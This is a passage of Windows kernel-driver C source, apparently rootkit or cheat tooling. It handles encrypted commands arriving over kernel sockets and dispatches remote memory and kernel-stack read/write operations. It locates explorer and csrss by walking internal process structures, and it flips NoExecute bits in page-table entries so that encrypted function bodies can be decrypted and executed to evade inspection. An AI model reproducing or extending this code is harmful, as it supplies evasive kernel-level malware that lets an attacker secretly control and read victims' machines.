		//FREE_FUNCTION_ENTRY(_hEncrypt_DEC, u_hEncrypt_DEC);
		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, usendEncrypt, pCommon->sgin);
		if (s >= 128) {
			Ret = usendEncrypt(_pGData, s, 0xC0000004, NULL, 0);
			break;
		}
		char* rBuffer = WskInfo->_SocketArry[s].pSendBuffer; // BufferArry[s].BufferSend;
		if (rBuffer == NULL) {
			Ret = usendEncrypt(_pGData, s, 0xC0000009, NULL, 0);
			break;
		}
		LPMSGCOMMON pCommonSend = (LPMSGCOMMON)rBuffer;
		

		//KeLowerIrql

		//fNtos->KeLowerIrql(APC_LEVEL);
		//_FUNCTION_IMP_APC(IOSocketBuffer, Ret, pGData, s, pCommon->sgin, (LPIOINFO)&pCommon->common, (char*)&pCommonSend->common);
		//fNtos->KfRaiseIrql(DISPATCH_LEVEL);

		//RUN_APC_ARG* Arg = &WskInfo->_SocketArry[s]._RunApcArg[1];
		//Arg->u.RunApc.pGData = pGData;
		//Arg->u.RunApc.s = s;
		//Arg->u.RunApc.IOMajor = pCommon->sgin;
		//Arg->u.RunApc.pInfo = (LPIOINFO)&pCommon->common;
		//Arg->u.RunApc.rBuffer = (char*)&pCommonSend->common;
		//_FUNCTION_IMP(RunApcRunCode, Ret, _pGData, s, 0x80000001);

		WORKER_T_INFO* pWorkInfo = &WskInfo->_SocketArry[s].TWorker;
		pWorkInfo->pGData = pGData;
		pWorkInfo->s = s;
		pWorkInfo->IOMajor = pCommon->sgin;
		pWorkInfo->pInfo = (LPIOINFO)&pCommon->common;
		pWorkInfo->rBuffer = (char*)&pCommonSend->common;

		DWORD Type = pWorkInfo->pInfo->Type;

		if (pWorkInfo->IOMajor == BROTHER_DRIVERCODE_MEMORY && 
			Type != 2 &&
			Type != KERNEL_STACK_READ &&
			Type != KERNEL_STACK_WRITE)
		{
			_FUNCTION_IMP(IOSocketBuffer, Ret, pGData, s, pCommon->sgin, (LPIOINFO)&pCommon->common, (char*)&pCommonSend->common);
		}
		else
		{
			//fNtos->ExSetTimerResolution(fNtos->MinTimerRound, TRUE);
			ExInitializeWorkItem(&pWorkInfo->WorkQueueItem, (PWORKER_THREAD_ROUTINE)pGData->_Work_Memory.SelfTradition, pWorkInfo);
			fNtos->ExQueueWorkItem(&pWorkInfo->WorkQueueItem, HyperCriticalWorkQueue);
		}




		//ExQueueWorkItemEx

	} while (0);

	FREE_FUNCTION_ENTRY(sendEncrypt, MFlags);
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, _pGData, Ret);
	return Ret;
}








NTSTATUS NTAPI FindProcessHandle(PVOID pGData, STRING * AString,DWORD* pSize, HANDLE* ProcessArry) 
{
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;
	PEPROCESS eprocess = fNtos->IoGetCurrentProcess();
	PLIST_ENTRY pProcessLink = (PLIST_ENTRY)((DWORD64)eprocess + fNtos->offsetProcessLink);
	PLIST_ENTRY bEntry = pProcessLink;

	UCHAR Name[16];
	fNtos->memset(Name, 0, 16);
	int nSize = (AString->Length > 15) ? 15 : AString->Length;
	fNtos->CopyMemory(Name, AString->Buffer, AString->Length);
	*pSize = 0;
	do {
		if (fNtos->MmIsAddressValid(bEntry))
		{
			PEPROCESS _eprocess = (PEPROCESS)((DWORD64)bEntry - fNtos->offsetProcessLink);
				UCHAR* pChar = (PUCHAR)((DWORD64)_eprocess + fNtos->offsetProcessName);
				UCHAR NameProcess[16];
				fNtos->memset(NameProcess, 0, 16);
				fNtos->CopyMemory(NameProcess, pChar, 15);

				//LOG_DEBUG("%s %s  %d\n", Name, NameProcess, fNtos->stricmp((char*)Name, (char*)NameProcess));
				if (fNtos->stricmp((char*)Name, (char*)NameProcess) == 0) {
					ProcessArry[(*pSize)++] = fNtos->PsGetProcessId(_eprocess);
				}
		}

		bEntry = bEntry->Flink;
	} while (bEntry != pProcessLink);

	return STATUS_UNSUCCESSFUL;
}


NTSTATUS NTAPI FindProcessID(PVOID pGData, UNICODE_STRING* ProcessName, DWORD* pSize, DWORD* ProcessArry) {

	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PSYSTEM_PROCESSES pProcessInfo = NULL;
	PSYSTEM_PROCESSES pTemp = NULL;//这个留作以后释放指针的时候用。
	ULONG ulNeededSize = 0;
	ULONG ulNextOffset = 0;

	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	//SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;
	// LOG_DEBUG("FindProcessID %ws \n", ProcessName->Buffer);

	

	//KIRQL irql = KeGetCurrentIrql();

	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pTemp, irql);

	//fNtos->KeLowerIrql(PASSIVE_LEVEL);


	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pTemp, irql);
	//KIRQL irql = KeGetCurrentIrql();
	//fNtos->KeLowerIrql(APC_LEVEL);
	KPROCESSOR_MODE PreviousMode = fNtos->ExGetPreviousMode();
	if (PreviousMode == KernelMode)
	{
		do
		{
			*pSize = 0;
			status = fNtos->NtQuerySystemInformation(SystemProcessesAndThreadsInformation, pProcessInfo, 0, &ulNeededSize);
			if (STATUS_INFO_LENGTH_MISMATCH == status)
			{
				do
				{
					pProcessInfo = (PSYSTEM_PROCESSES)fNtos->ExAllocatePoolWithTag(NonPagedPool, ulNeededSize, '1aes');
				} while (pProcessInfo == 0);
				pTemp = pProcessInfo;
				status = fNtos->NtQuerySystemInformation(SystemProcessesAndThreadsInformation, pProcessInfo, ulNeededSize, &ulNeededSize);
				if (NT_SUCCESS(status))
				{
					do
					{
						if (fNtos->MmIsAddressValid(pProcessInfo->ProcessName.Buffer) && NULL != pProcessInfo)
						{
							if (fNtos->RtlEqualUnicodeString(ProcessName, &pProcessInfo->ProcessName, TRUE)) {
								ProcessArry[*pSize] = (DWORD)(DWORD64)pProcessInfo->ProcessId;
								(*pSize)++;
							}
						}
						ulNextOffset = pProcessInfo->NextEntryDelta;
						pProcessInfo = (PSYSTEM_PROCESSES)((PUCHAR)pProcessInfo + pProcessInfo->NextEntryDelta);

					} while (ulNextOffset != 0);
				}

			}
		} while (0);

		if (pTemp != 0)
		{
		     fNtos->ExFreePoolWithTag(pTemp, '1aes');
		}
	}
	//else
	//{

	//	do
	//	{
	//		PVOID addr = 0;
	//		size_t size = PAGE_SIZE;
	//		do {
	//			status = fNtos->ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
	//			if (NT_SUCCESS(status) && addr != 0) {
	//				break;
	//			}
	//		} while (1);

	//		PULONG pLong = addr;
	//		*pLong = 0;
	//		status = fNtos->NtQuerySystemInformation(SystemProcessesAndThreadsInformation, pProcessInfo, 0, pLong);
	//		if (STATUS_INFO_LENGTH_MISMATCH == status) {

	//			size = *pLong;
	//			do {
	//				status = fNtos->ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
	//				if (NT_SUCCESS(status) && addr != 0) {
	//					break;
	//				}
	//			} while (1);
	//			pProcessInfo = addr;
	//			pTemp = pProcessInfo;
	//			status = fNtos->NtQuerySystemInformation(SystemProcessesAndThreadsInformation, pProcessInfo, (ULONG)size, pLong);

	//			if (NT_SUCCESS(status))
	//			{
	//				do
	//				{
	//					if (fNtos->MmIsAddressValid(pProcessInfo->ProcessName.Buffer) && NULL != pProcessInfo)
	//					{
	//						if (fNtos->RtlEqualUnicodeString(ProcessName, &pProcessInfo->ProcessName, TRUE)) {
	//							ProcessArry[*pSize] = (DWORD)(DWORD64)pProcessInfo->ProcessId;
	//							(*pSize)++;
	//						}
	//					}
	//					ulNextOffset = pProcessInfo->NextEntryDelta;
	//					pProcessInfo = (PSYSTEM_PROCESSES)((PUCHAR)pProcessInfo + pProcessInfo->NextEntryDelta);

	//				} while (ulNextOffset != 0);
	//			}

	//		}
	//		size = 0;
	//		if (pTemp != 0){
	//			fNtos->ZwFreeVirtualMemory(ZwCurrentProcess(), (PVOID)pTemp, &size, MEM_RELEASE);
	//		}
	//		fNtos->ZwFreeVirtualMemory(ZwCurrentProcess(), (PVOID)pLong, &size, MEM_RELEASE);

	//	} while (0);
	//}


	//fNtos->KfRaiseIrql(irql);

	return status;
}

NTSTATUS NTAPI FindProcessID8(PVOID pGData, UNICODE_STRING* ProcessName, DWORD* pSize, HANDLE* ProcessArry) {

	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PSYSTEM_PROCESSES pProcessInfo = NULL;
	PSYSTEM_PROCESSES pTemp = NULL;//这个留作以后释放指针的时候用。
	ULONG ulNeededSize = 0;
	ULONG ulNextOffset = 0;

	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	//SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;
	// LOG_DEBUG("FindProcessID %ws \n", ProcessName->Buffer);



	//KIRQL irql = KeGetCurrentIrql();

	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pTemp, irql);

	//fNtos->KeLowerIrql(PASSIVE_LEVEL);


	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pTemp, irql);
	//KIRQL irql = KeGetCurrentIrql();
	//fNtos->KeLowerIrql(APC_LEVEL);
	KPROCESSOR_MODE PreviousMode = fNtos->ExGetPreviousMode();
	if (PreviousMode == KernelMode)
	{
		do
		{
			*pSize = 0;
			status = fNtos->NtQuerySystemInformation(SystemProcessesAndThreadsInformation, pProcessInfo, 0, &ulNeededSize);
			if (STATUS_INFO_LENGTH_MISMATCH == status)
			{
				do
				{
					pProcessInfo = (PSYSTEM_PROCESSES)fNtos->ExAllocatePoolWithTag(NonPagedPool, ulNeededSize, '1aes');
				} while (pProcessInfo == 0);
				pTemp = pProcessInfo;
				status = fNtos->NtQuerySystemInformation(SystemProcessesAndThreadsInformation, pProcessInfo, ulNeededSize, &ulNeededSize);
				if (NT_SUCCESS(status))
				{
					do
					{
						if (fNtos->MmIsAddressValid(pProcessInfo->ProcessName.Buffer) && NULL != pProcessInfo)
						{
							if (fNtos->RtlEqualUnicodeString(ProcessName, &pProcessInfo->ProcessName, TRUE)) {
								ProcessArry[*pSize] = pProcessInfo->ProcessId;
								(*pSize)++;
							}
						}
						ulNextOffset = pProcessInfo->NextEntryDelta;
						pProcessInfo = (PSYSTEM_PROCESSES)((PUCHAR)pProcessInfo + pProcessInfo->NextEntryDelta);

					} while (ulNextOffset != 0);
				}

			}
		} while (0);

		if (pTemp != 0)
		{
			fNtos->ExFreePoolWithTag(pTemp, '1aes');
		}
	}
	else
	{

		do
		{
			PVOID addr = 0;
			size_t size = PAGE_SIZE;
			do {
				status = fNtos->ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
				if (NT_SUCCESS(status) && addr != 0) {
					break;
				}
			} while (1);

			PULONG pLong = addr;
			*pLong = 0;
			status = fNtos->NtQuerySystemInformation(SystemProcessesAndThreadsInformation, pProcessInfo, 0, pLong);
			if (STATUS_INFO_LENGTH_MISMATCH == status) {

				size = *pLong;
				do {
					status = fNtos->ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
					if (NT_SUCCESS(status) && addr != 0) {
						break;
					}
				} while (1);
				pProcessInfo = addr;
				pTemp = pProcessInfo;
				status = fNtos->NtQuerySystemInformation(SystemProcessesAndThreadsInformation, pProcessInfo, (ULONG)size, pLong);

				if (NT_SUCCESS(status))
				{
					do
					{
						if (fNtos->MmIsAddressValid(pProcessInfo->ProcessName.Buffer) && NULL != pProcessInfo)
						{
							if (fNtos->RtlEqualUnicodeString(ProcessName, &pProcessInfo->ProcessName, TRUE)) {
								ProcessArry[*pSize] = pProcessInfo->ProcessId;
								(*pSize)++;
							}
						}
						ulNextOffset = pProcessInfo->NextEntryDelta;
						pProcessInfo = (PSYSTEM_PROCESSES)((PUCHAR)pProcessInfo + pProcessInfo->NextEntryDelta);

					} while (ulNextOffset != 0);
				}

			}
			size = 0;
			if (pTemp != 0){
				fNtos->ZwFreeVirtualMemory(ZwCurrentProcess(), (PVOID)pTemp, &size, MEM_RELEASE);
			}
			fNtos->ZwFreeVirtualMemory(ZwCurrentProcess(), (PVOID)pLong, &size, MEM_RELEASE);

		} while (0);
	}


	//fNtos->KfRaiseIrql(irql);

	return status;
}

//&& pCurMM.u.Hard.Valid != 0


void SetAddressExecute(PVOID pGData, PVOID Ptr, DWORD nSize, DWORD Flags) {

	Global_Data* pData = (Global_Data*)pGData;
	char* pBegin = Ptr;
	DWORD nPage = nSize / PAGE_SIZE;
	if (nSize % PAGE_SIZE)nPage++;

	//LOG_DEBUG("Ptr<%p> nPage size <%d>  <nSize  %d>\n", Ptr, nPage, nSize);
//	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	//NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr.Ptr,
	//	__LINE__, Ptr);
	for (DWORD iPage = 0; iPage < nPage; iPage++) {

		MMPTE* pMmpte = 0;
		char* bBegin = pBegin + (PAGE_SIZE * iPage);
		GetAddressPfn((DWORD64)bBegin, pData->PTE_BASE, pMmpte);
		//LOG_DEBUG("pMmpte == <%p>\n", pMmpte);

		if (pMmpte == 0) { 
			/*LOG_DEBUG("pMmpte==0\n")*/


			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr.Ptr,
			//	__LINE__, pGData);
			break; }
		pMmpte->u.Hard.NoExecute = Flags;
		//KIRQL irql = (KIRQL)ReadCR8();
		//WriteCR8(HIGH_LEVEL);
		__invlpg(pMmpte);
		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, pMmpte->u.Long, Flags);
		//WriteCR8(irql);
		//LOG_DEBUG("New PTE <%p> \n", pMmpte->u.Long)
	}
}



void SetAddressValidPte(PVOID pGData, PVOID Ptr, DWORD nSize, MMPTE* Flags) {

	Global_Data* pData = (Global_Data*)pGData;
	char* pBegin = Ptr;
	DWORD nPage = nSize / PAGE_SIZE;
	if (nSize % PAGE_SIZE)nPage++;
	for (DWORD iPage = 0; iPage < nPage; iPage++) {

		MMPTE* pMmpte = 0;
		char* bBegin = pBegin + (PAGE_SIZE * iPage);
		GetAddressPfn((DWORD64)bBegin, pData->PTE_BASE, pMmpte);
		if (pMmpte == 0) {
			break;
		}
		pMmpte->u.Long |= Flags->u.Long;
		__invlpg(pMmpte);
	}
}

//void SetAddressExecuteNow(PVOID pGData, PVOID Ptr, DWORD nSize, DWORD Flags) {
//
//	Global_Data* pData = (Global_Data*)pGData;
//	char* pBegin = Ptr;
//	DWORD nPage = nSize / PAGE_SIZE;
//	if (nPage % PAGE_SIZE)nPage++;
//	for (DWORD iPage = 0; iPage < nPage; iPage++) {
//
//		MMPTE* pMmpte = 0;
//		char* bBegin = pBegin + PAGE_SIZE * iPage;
//		GetAddressPfn((DWORD64)bBegin, pData->PTE_BASE, pMmpte);
//		if (pMmpte == 0)break;
//		pMmpte->u.Hard.NoExecute = Flags;
//		__invlpg(pMmpte);
//	}
//}


HANDLE NTAPI Get_Win32k_Process_Explorer(PVOID _pGData, DWORD Flags){

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	Windows_Buffer_Explorer* pExplorer = &((Global_Data*)pGData)->bExplorer;
	//SELF_UNICODE_STRING_ARRY* uArry = &((Global_Data*)pGData)->SelfUArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;


	if (Flags == 0)
	{
		if (pExplorer->Win32k_Process_Explorer)
		{

			PEPROCESS process = 0;
			SOCKET s = fNtos->s;;
			_FUNCTION_IMP_RET(GetProcessEprocess, process, PEPROCESS, pGData, (HANDLE)pExplorer->Win32k_Process_Explorer);



			LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, process);

			//PMDL pMdlProcess = 0;
			//_GetProcessEprocess FGetProcessEprocess = 0;
			//_FUNCTION_ENTRY_MDL(GetProcessEprocess, FGetProcessEprocess, _GetProcessEprocess, &pMdlProcess);
			//PEPROCESS process = FGetProcessEprocess(pGData, (HANDLE)pExplorer->Win32k_Process_Explorer);
			//FREE_FUNCTION_ENTRY(FGetProcessEprocess, pMdlProcess);

			if (process != 0){
				return pExplorer->Win32k_Process_Explorer;
			}
			else
			{
				pExplorer->Win32k_Process_Explorer = 0;
			}
			//EventDescGetLevel

			//PEPROCESS eprocess;
			//if (NT_SUCCESS(fNtos->PsLookupProcessByProcessId(pExplorer->Win32k_Process_Explorer, &eprocess))) {
			//	fNtos->ObfDereferenceObject(eprocess);
			//	return pExplorer->Win32k_Process_Explorer;
			//}
			//else {
			//	pExplorer->Win32k_Process_Explorer = 0;
			//}
		}
		if (pExplorer->Win32k_Process_Explorer == NULL) {

			/*		UNICODE_STRING uExplorer;
					wchar_t pExplorerName[40];
					fNtos->CopyMemory(pExplorerName, uArry->Explorer.Ptr, uArry->Explorer.MaxSize);
					fArry->_hEncrypt_DEC_V.SelfTradition(0, uArry->Explorer.Sgin, pExplorerName, uArry->Explorer.MaxSize);

					fNtos->RtlInitUnicodeString(&uExplorer, pExplorerName); */// L"Explorer.exe"






			CODE_ANSI_STRING* pString = 0;
			STRING AExplorer;
			if (Flags == 0) {
				pString = &AArry->Explorer;
			}
			else if (Flags == 1) {
				pString = &AArry->Csrss;
			}
			char pExplorerName[MAX_PATH + 1];
			fNtos->memset(pExplorerName, 0, sizeof(pExplorerName));
			if (pString != 0) {

				if (pString->MaxSize > MAX_PATH) {
					return 0;
				}
				fNtos->CopyMemory(pExplorerName, pString->Ptr, pString->MaxSize);
				AExplorer.Buffer = pExplorerName;
				AExplorer.Length = (USHORT)pString->Size;
				AExplorer.MaximumLength = (USHORT)pString->MaxSize;


			}



			LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, 0);

			//((Global_Data*)pGData)->_hEncrypt_DEC_V.SelfTradition(0, AArry->Explorer.Sgin, pExplorerName, AArry->Explorer.MaxSize);
			// FindProcessHandle

			//LOG_DEBUG_CODE();
			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, uArry->Explorer.Ptr);

			//STRING ANameProcess

			DWORD64 dwID_Arry[20];
			//fNtos->memset(dwID_Arry, 0, sizeof(dwID_Arry));
			DWORD64 nSize = 20;
			DWORD64 IMP_RET = 0;


			//KIRQL irql = KeGetCurrentIrql();
			//_FUNCTION_IMP(FindProcessID, IMP_RET, pGData, &uExplorer, &nSize, dwID_Arry);
			//fNtos->KfRaiseIrql(irql);


			SOCKET s = fNtos->s;;

			_FUNCTION_IMP(FindProcessHandle, IMP_RET, pGData, &AExplorer, &nSize, dwID_Arry);

			LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, pGData);
			if (nSize > 0) {
				//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, uArry->Explorer.Ptr);
				pExplorer->Win32k_Process_Explorer = (HANDLE)dwID_Arry[0];
				//PEPROCESS eprocess;
				// KeStackAttachProcess 不再适用
				return pExplorer->Win32k_Process_Explorer;
				//if (NT_SUCCESS(fNtos->PsLookupProcessByProcessId(pExplorer->Win32k_Process_Explorer, &eprocess))) {
				//	//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, uArry->Explorer.Ptr);
				//	KAPC_STATE stack;
				//	fNtos->memset(&stack, 0, sizeof(stack));
				//	NTSTATUS status = STATUS_SUCCESS;
				//	fNtos->KeStackAttachProcess(eprocess, &stack);
				//	size_t size = PAGE_SIZE * 3;
				//	status = fNtos->ZwAllocateVirtualMemory(ZwCurrentProcess(), &pExplorer->Win32k_Process_Explorer_Buffer, 0, &size, MEM_COMMIT, PAGE_READWRITE);
				//	fNtos->KeUnstackDetachProcess(&stack);
				//	fNtos->ObfDereferenceObject(eprocess);
				//	if (!NT_SUCCESS(status)) {
				//		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, uArry->Explorer.Ptr);
				//		pExplorer->Win32k_Process_Explorer = 0;
				//	}
				//	return pExplorer->Win32k_Process_Explorer;
				//}
			}
		}
		return pExplorer->Win32k_Process_Explorer;
	}
	else if (Flags == 1) {

	if (pExplorer->Win32k_Process_Csrss)
	{


		SOCKET s = fNtos->s;;
		MEMORY_FLAGS MFlags_Process;
		_GetProcessEprocess uGetProcessEprocess = 0;
		_FUNCTION_ENTRY(GetProcessEprocess, MFlags_Process, _GetProcessEprocess);
		PEPROCESS process = uGetProcessEprocess(pGData, pExplorer->Win32k_Process_Csrss);
		FREE_FUNCTION_ENTRY(GetProcessEprocess, MFlags_Process);


		LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, process);

		if (process != 0) {
			return pExplorer->Win32k_Process_Csrss;
		}
		else
		{
			pExplorer->Win32k_Process_Csrss = 0;
		}

		//PEPROCESS eprocess;
		//if (NT_SUCCESS(fNtos->PsLookupProcessByProcessId(pExplorer->Win32k_Process_Csrss, &eprocess))) {
		//	fNtos->ObfDereferenceObject(eprocess);
		//	return pExplorer->Win32k_Process_Csrss;
		//}
		//else {
		//	pExplorer->Win32k_Process_Csrss = 0;
		//}
	}
	if (pExplorer->Win32k_Process_Csrss == NULL) {

		/*		UNICODE_STRING uExplorer;
				wchar_t pExplorerName[40];
				fNtos->CopyMemory(pExplorerName, uArry->Explorer.Ptr, uArry->Explorer.MaxSize);
				fArry->_hEncrypt_DEC_V.SelfTradition(0, uArry->Explorer.Sgin, pExplorerName, uArry->Explorer.MaxSize);

				fNtos->RtlInitUnicodeString(&uExplorer, pExplorerName); */// L"Explorer.exe"






		CODE_ANSI_STRING* pString = 0;
		STRING AExplorer;
		if (Flags == 0) {
			pString = &AArry->Explorer;
		}
		else if (Flags == 1) {
			pString = &AArry->Csrss;
		}
		char pExplorerName[MAX_PATH + 1];
		fNtos->memset(pExplorerName, 0, sizeof(pExplorerName));
		if (pString != 0) {

			if (pString->MaxSize > MAX_PATH) {
				return 0;
			}
			fNtos->CopyMemory(pExplorerName, pString->Ptr, pString->MaxSize);
			AExplorer.Buffer = pExplorerName;
			AExplorer.Length = (USHORT)pString->Size;
			AExplorer.MaximumLength = (USHORT)pString->MaxSize;


		}





		//((Global_Data*)pGData)->_hEncrypt_DEC_V.SelfTradition(0, AArry->Explorer.Sgin, pExplorerName, AArry->Explorer.MaxSize);
		// FindProcessHandle

		//LOG_DEBUG_CODE();
		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, uArry->Explorer.Ptr);

		//STRING ANameProcess

		DWORD64 dwID_Arry[20];
		//fNtos->memset(dwID_Arry, 0, sizeof(dwID_Arry));
		DWORD64 nSize = 20;
		DWORD64 IMP_RET = 0;


		//KIRQL irql = KeGetCurrentIrql();
		//_FUNCTION_IMP(FindProcessID, IMP_RET, pGData, &uExplorer, &nSize, dwID_Arry);
		//fNtos->KfRaiseIrql(irql);

		SOCKET s = fNtos->s;;
		LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, 0);
		_FUNCTION_IMP(FindProcessHandle, IMP_RET, pGData, &AExplorer, &nSize, dwID_Arry);
		LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, 0);

		if (nSize > 0) {
			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, uArry->Explorer.Ptr);
			pExplorer->Win32k_Process_Csrss = (HANDLE)dwID_Arry[0];
			//PEPROCESS eprocess;
			// KeStackAttachProcess 不再适用
			return pExplorer->Win32k_Process_Csrss;
			//if (NT_SUCCESS(fNtos->PsLookupProcessByProcessId(pExplorer->Win32k_Process_Explorer, &eprocess))) {
			//	//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, uArry->Explorer.Ptr);
			//	KAPC_STATE stack;
			//	fNtos->memset(&stack, 0, sizeof(stack));
			//	NTSTATUS status = STATUS_SUCCESS;
			//	fNtos->KeStackAttachProcess(eprocess, &stack);
			//	size_t size = PAGE_SIZE * 3;
			//	status = fNtos->ZwAllocateVirtualMemory(ZwCurrentProcess(), &pExplorer->Win32k_Process_Explorer_Buffer, 0, &size, MEM_COMMIT, PAGE_READWRITE);
			//	fNtos->KeUnstackDetachProcess(&stack);
			//	fNtos->ObfDereferenceObject(eprocess);
			//	if (!NT_SUCCESS(status)) {
			//		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, uArry->Explorer.Ptr);
			//		pExplorer->Win32k_Process_Explorer = 0;
			//	}
			//	return pExplorer->Win32k_Process_Explorer;
			//}
		}
	}
	return pExplorer->Win32k_Process_Csrss;


  }

  return 0;
}








//-----------------------------------------------------------------------
//#define  _FUNCTION_ENTRY(name,x,y) 	{y _Buffer_Imp = (y)fNtos->ExAllocatePoolWithTag(PagedPool, fArry->##name##.MaxSize, 0xAFAF);\
//                                        fNtos->CopyMemory((PVOID)_Buffer_Imp, fArry->##name##.Ptr, fArry->##name##.MaxSize);\
//                                        fArry->_hEncrypt_DEC_V.SelfTradition(pGData,fArry->##name##.Sgin,_Buffer_Imp,fArry->##name##.MaxSize);\
//                                        fArry->SetAddressExecute.SelfTradition(pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 0);\
//										x = _Buffer_Imp;}\
//										//fArry->SetAddressExecute.SelfTradition(pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 1);\
//										//fNtos->ExFreePoolWithTag((PVOID)_Buffer_Imp, 0xAFAF);\



//	DWORD _nSizeNode = pCodeC->Size / 0x20;if (pCodeC->Size % 0x20 != 0) {nSizeNode++;}


//VOID FREE_KSOCKET(PVOID _pGData, SOCKET s) {
//
//
//
//
//
//
//
//
//
//
//
//
//}






VOID THREAD_RECV_SEND_HANDLE_SOCKET(VOID* Arg) {


	SOCKET_HANDLE_INFO* pHI = (SOCKET_HANDLE_INFO*)Arg;
	Global_Data* pGData = (Global_Data*)pHI->pGdata;
	WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;

	LARGE_INTEGER TimeOut;
	TimeOut.QuadPart = -10 * 100 * 5 * 1000 * 100;

	fNtos->KeSetPriorityThread(KeGetCurrentThread(), HIGH_PRIORITY);

	while (1){
		NTSTATUS status = fNtos->KeWaitForSingleObject(&pHI->hEvent, Executive, 
			KernelMode, TRUE, &TimeOut);
		if (STATUS_SUCCESS == status){





		}
	}

	//while (fNtos->KeWaitForSingleObject(,))
	//{

	//}














}



NTSTATUS RECV_SEND_ROUTINE(PVOID _pGData, SOCKET s, DWORD Flags) {

	Global_Data* pGData = (Global_Data*)_pGData;
	WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	SOCKET_INFO * pSocketInfo = &WskInfo->_SocketArry[s];
	KSOCKET * pSocket = &WskInfo->bWsk.kSocket[s];

	NTSTATUS status = STATUS_SUCCESS;
	status = pSocket->AsyncContext.Irp->IoStatus.Status;

	pGData->KTime = fNtos->KeQueryPerformanceCounter(0);


	if (NT_SUCCESS(status))
	{
		if (Flags) {
			// Send 传送成功  马上RECV

			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pSocket, Flags);
			MEMORY_FLAGS MFlags;
			_SendRecvFromEx uSendRecvFromEx = 0;
			_FUNCTION_ENTRY(SendRecvFromEx, MFlags, _SendRecvFromEx);
			status = uSendRecvFromEx(pGData, s, &pSocketInfo->kRecvBuffer, 0);
			FREE_FUNCTION_ENTRY(SendRecvFromEx, MFlags);

		}
		else
		{

			//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pSocket, pSocket->AsyncContext.Irp->IoStatus.Status);
			ULONG  Length = (ULONG)pSocket->AsyncContext.Irp->IoStatus.Information;
			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pSocket, Length);
			if (Length > 0){
				DWORD64 uRet = 0;
				_FUNCTION_IMP(hBufferSocket, uRet, pGData, s, pSocketInfo->pRecvBuffer, Length);
				//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pSocket, Length);
			}

		}
	}

	// 失败了就释放
	if (!NT_SUCCESS(status)) {

		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pSocket, pSocket->AsyncContext.Irp->IoStatus.Status);

		//ChangeEntryListSocket
